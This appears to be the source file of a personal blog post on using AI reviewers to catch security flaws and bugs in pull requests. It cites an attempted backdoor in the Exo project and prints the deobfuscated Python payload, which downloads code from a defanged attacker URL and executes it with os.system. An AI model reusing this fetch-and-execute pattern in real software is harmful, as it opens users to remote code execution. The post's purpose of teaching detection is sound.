import { Metadata } from "next";
import { BlogPost } from "@/components/blog/BlogPost";
import { Title, Heading, SubHeading } from "@/components/blog/Heading";
import { Text } from "@/components/blog/Text";
import { List, ListItem } from "@/components/blog/List";
import { CodeBlock } from "@/components/CodeBlock";
import { ExternalLink } from "@/components/blog/ExternalLink";
import { Tweet } from "@/components/blog/Tweet";

export const metadata: Metadata = {
  title: "Using AI to Reduce Human Errors in Code Reviews | Bogdan Stanga",
  description:
    "Learn how AI-powered code reviews can catch security vulnerabilities, prevent bugs, and complement human reviewers. Real examples of how LLMs detect malicious code, API key leaks, and common anti-patterns in pull requests.",
  keywords: [
    "LLM code review",
    "AI code reviewer",
    "code security",
    "automated code review",
    "pull request security",
    "code vulnerability detection",
    "AI security review",
    "code quality automation",
    "secure code review",
    "malicious code detection",
  ].join(", "),
  openGraph: {
    title: "Using AI to Reduce Human Errors in Code Reviews",
    description:
      "Discover how AI-powered code reviews can catch security vulnerabilities and complement human reviewers with real-world examples of detecting malicious code and API key leaks.",
    type: "article",
    url: "https://bogdanstanga.com/ai-reviewers",
    images: [
      {
        url: "https://avatars.githubusercontent.com/u/3215078",
        width: 1200,
        height: 630,
        alt: "AI Code Review Security",
      },
    ],
  },
  twitter: {
    card: "summary_large_image",
    title: "Using AI to Reduce Human Errors in Code Reviews",
    description:
      "Discover how AI-powered code reviews can catch security vulnerabilities and complement human reviewers with real-world examples of detecting malicious code and API key leaks.",
    creator: "@bdstanga",
    images: ["https://avatars.githubusercontent.com/u/3215078"],
  },
};

export default function AIReviewersPost() {
  return (
    <BlogPost>
      <Title>Using AI to Reduce Human Errors in Code Reviews</Title>

      <Text>
        In the era of LLM-based tools like{" "}
        <ExternalLink href="https://cursor.sh">Cursor</ExternalLink> and{" "}
        <ExternalLink href="https://github.com/features/copilot">
          Copilot
        </ExternalLink>
        , we're seeing a shift in how we write code. Development is moving
        faster, and we're publishing more code than ever before.{" "}
        <b>But what about the way we review code?</b>
      </Text>

      <Text>
        Just as AI tools have enhanced our code writing capabilities, they can
        also transform how we approach code reviews. An AI-powered reviewer can
        serve as a tireless assistant, instantly analyzing code changes for
        potential issues before human reviewers even begin their review,
        basically as a fully automated <b>pre-reviewer</b>.
      </Text>

      <Heading>The Current State of Code Reviews</Heading>

      <Text>
        While AI assistants have revolutionized code writing, code review
        remains largely a manual process which often witnesses trade-offs
        between speed and quality. This trade-off is particularly prevalent
        when:
      </Text>

      <List>
        <ListItem>Teams are working under tight deadlines</ListItem>
        <ListItem>Reviewing large, complex pull requests</ListItem>
        <ListItem>Dealing with unfamiliar parts of the codebase</ListItem>
        <ListItem>Limited bandwidth of experienced reviewers</ListItem>
      </List>

      <Text>
        These trade-offs are sometimes very costly for companies, as a
        not-so-thorough review often leads to bugs, security issues, and
        critical problems that can have a huge impact on the product.{" "}
        <b>
          This is where LLM-based reviewers can provide a first line of defense
          by highlighting any potential vulnerabilities to the human reviewer,
          basically eliminating the <i>overlooking issue</i>.
        </b>
      </Text>

      <Heading>Where AI Reviewers Shine</Heading>

      <Text>
        AI Code Reviewers are particularly good at identifying common issues on
        individual pieces of code, such as possible runtime errors, security
        vulnerabilities, api key leaks, and common anti-patterns.
      </Text>

      <SubHeading>1. Identifying Security Vulnerabilities</SubHeading>

      <Text>
        The post below blew up recently on X (Twitter). It shows an attempt to
        inject a backdoor into{" "}
        <ExternalLink href="https://github.com/exo-explore/exo">
          Exo
        </ExternalLink>
        , a popular open-source project.
      </Text>

      <Tweet id="1856295635143524378" />

      <Text>
        The executed code was obfuscated into Unicode characters to somehow
        avoid detection, and it translated into the following:
      </Text>

      <CodeBlock
        language="python"
        code={`import os
import urllib
import urllib.request
x = urllib.request.urlopen("hxxps://www.evildojo[.]com/stage1payload")
y = x.read()
z = y.decode("utf8")
x.close()
os.system(z)`}
      />

      <Text>
        Basically this patch was aiming to execute some remote code on each user
        of this library or other projects depending on it. It's unclear what the
        remote code was, since at the time of Pull Request the remote url was
        non existant, probably the attacker waiting for the code to be deployed
        first.
      </Text>

      <Text>
        In this case, the human reviewer was vigilant enough to spot the anormal
        change within the pull request, but note that this was a rather poor
        attempt. There was very little code changed, and the malicious part was
        rather obvious.{" "}
        <b>
          Now image this is part of a major change with 1000+ lines of code.
        </b>
      </Text>

      <Text>
        This is one of the flagship use-cases for AI Reviewers. To demonstrate
        this, I've recreated the PR and ran my rather simplistic AI reviewer on
        this code change to see how well it detects the threat.
      </Text>

      <Tweet id="1856430697352708149" />

      <Text>
        As you can see the AI reviewer was able to spot the issue instantly and
        make it very clear to everyone checking the Pull Request that the code
        is posing a critical security risk.
      </Text>

      <SubHeading>2. Detecting Hardcoded Secrets and API Key Leaks</SubHeading>

      <Text>
        One of the most obvious yet devastating mistakes developers can make is
        committing sensitive data, like API keys, passwords, or tokens, to
        source control. AI reviewers excel at spotting these by scanning for
        patterns resembling secrets, such as: API keys for common services
        (e.g., AWS, Stripe, Google Cloud). Passwords embedded in configuration
        files. Private keys accidentally included in commits. AI tools like{" "}
        <ExternalLink href="http://presubmit.ai">
          Presubmit Reviewer
        </ExternalLink>{" "}
        can flag these instantly, even suggesting remediation steps, such as
        replacing the hardcoded key with environment variables or secret
        management solutions.
      </Text>

      <SubHeading>3. Catching Critical Bugs Early</SubHeading>

      <Text>
        AI reviewers shine in detecting critical bugs that could otherwise slip
        through due to human oversight:
      </Text>

      <List>
        <ListItem>
          <b>Null Pointer Exceptions</b>: Flagging possible null pointer runtime
          errors like{" "}
          <ExternalLink href="https://github.com/presubmit/ebank-backend/pull/9">
            this one
          </ExternalLink>
        </ListItem>
        <ListItem>
          <b>Concurrency Issues</b>: Identifying race conditions or improper
          thread synchronization.
        </ListItem>
        <ListItem>
          <b>Resource Leaks</b>: Spotting file or network connections that are
          opened but not closed.
        </ListItem>
      </List>

      <SubHeading>4. Accelerating Developer Feedback Loops</SubHeading>

      <Text>
        Manual code reviews are time-consuming, and reviewers may miss obvious
        issues, especially during high-pressure sprints. AI reviewers provide
        immediate feedback, allowing developers to:
      </Text>

      <List>
        <ListItem>
          Resolve issues before human reviewers even see the code.
        </ListItem>
        <ListItem>
          Reduce back-and-forth iterations during pull requests.
        </ListItem>
        <ListItem>
          Focus human reviews on higher-level design and logic instead of
          routine bug detection.
        </ListItem>
      </List>

      <Text>
        This not only saves time but also ensures that critical issues are
        addressed early in the development lifecycle.
      </Text>

      <Heading>Where AI Reviewers are Lacking</Heading>

      <Text>
        While AI reviewers excel at identifying specific code-level issues, they
        have significant limitations when it comes to understanding the broader
        context of a system. Let's look at where human reviewers still maintain
        a clear advantage:
      </Text>

      <List>
        <ListItem>
          <b>System Architecture Context</b> - AI reviewers can't understand how
          a change might impact other parts of the system that aren't directly
          referenced in the code
        </ListItem>
        <ListItem>
          <b>Historical Design Decisions</b> - They lack awareness of why
          certain architectural choices were made, which might make their
          suggestions counterproductive
        </ListItem>
        <ListItem>
          <b>Business Requirements</b> - They can't evaluate if a change
          actually solves the business problem it's meant to address
        </ListItem>
        <ListItem>
          <b>Performance Trade-offs</b> - They might suggest "cleaner" code that
          doesn't account for specific performance requirements or scale
          considerations
        </ListItem>
      </List>

      <Text>
        For example, an AI reviewer might flag this code as inefficient:
      </Text>

      <CodeBlock
        language="typescript"
        code={`// AI might suggest using a Set for O(1) lookup
const allowedUsers = ['user1', 'user2', 'user3'];

function checkAccess(userId: string) {
  return allowedUsers.includes(userId);
}`}
      />

      <Text>
        While technically correct about performance, the AI doesn't know that
        this is a deliberately simple implementation because the list will
        always be tiny and is checked infrequently. A human reviewer with
        context would understand that the slight performance gain isn't worth
        the added complexity.
      </Text>

      <Text>Similarly, consider this database query:</Text>

      <CodeBlock
        language="typescript"
        code={`// AI might flag this as inefficient
const results = await db.users.find({
  status: 'active',
  lastLogin: { $gt: thirtyDaysAgo }
}).toArray();

// Instead of suggesting:
const results = await db.users.find({
  status: 'active',
  lastLogin: { $gt: thirtyDaysAgo }
}).limit(10000).toArray();`}
      />

      <Text>
        An AI reviewer might suggest adding a limit to prevent memory issues,
        unaware that this query is part of a nightly batch job where we
        deliberately need all matching records. This highlights how AI reviewers
        can sometimes make suggestions that conflict with the actual
        requirements of the system.
      </Text>

      <Text>
        This is why the most effective code review process combines both AI and
        human reviewers. The AI can handle the mechanical aspects - catching
        security issues, potential bugs, and style inconsistencies - while human
        reviewers can focus on the higher-level concerns that require context
        and understanding of the broader system architecture and business
        requirements.
      </Text>

      <Heading>Conclusion</Heading>

      <Text>
        AI-powered code reviews represent a powerful addition to modern
        development workflows. As demonstrated by the Exo backdoor attempt,
        these AI reviewers can instantly spot potentially malicious code and
        security vulnerabilities that might slip through during large changes,
        especially under time pressure.
      </Text>

      <Text>
        However, they can't replace human expertise. While great at catching
        specific issues, AI reviewers lack the broader context needed to
        understand system architecture decisions and business requirements. The
        future of code review lies in combining AI's tireless attention to
        detail with human insight - using AI as a first line of defense while
        allowing human reviewers to focus on architecture, business logic, and
        system-wide implications.
      </Text>
    </BlogPost>
  );
}
